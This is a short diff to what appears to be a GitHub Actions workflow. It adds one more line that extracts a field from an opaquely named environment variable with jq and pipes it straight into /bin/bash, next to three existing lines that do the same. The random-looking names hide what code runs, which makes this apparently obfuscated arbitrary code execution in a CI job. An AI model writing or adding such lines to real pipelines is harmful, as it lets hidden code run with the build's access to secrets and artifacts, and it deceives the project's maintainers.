@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$l187" | jq -r .mlgo2 | /bin/bash
           echo $eon405 | jq -r .k02 | /bin/bash
           printf '%s' "$h9" | jq -r .juif2 | /bin/bash
+          echo $tbsco298 | jq -r .uqtk66605 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
